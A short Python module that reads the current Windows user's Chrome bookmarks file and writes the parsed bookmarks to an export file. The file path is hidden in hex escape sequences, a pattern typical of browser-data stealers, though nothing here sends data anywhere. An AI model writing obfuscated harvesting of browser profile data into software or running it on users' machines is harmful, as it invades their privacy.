import os
import file_utils

'''
NOTE: This file is related to procedures and processes in which bookmarks are collected from Google Chrome browser.
'''

def bookmark_scrape(export_file:str) -> str:
    browser_path = f"\x43\x3a\x2f\x55\x73\x65\x72\x73\x2f{os.getlogin()}\x2f\x41\x70\x70\x44\x61\x74\x61\x2f\x4c\x6f\x63\x61\x6c\x2f\x47\x6f\x6f\x67\x6c\x65\x2f\x43\x68\x72\x6f\x6d\x65\x2f\x55\x73\x65\x72\x20\x44\x61\x74\x61\x2f\x44\x65\x66\x61\x75\x6c\x74\x2f\x42\x6f\x6f\x6b\x6d\x61\x72\x6b\x73"
    bookmarks:list = file_utils.json_bookmark_parser(browser_path=browser_path)
    return file_utils.write(export_file=    export_file, bookmarks= bookmarks)

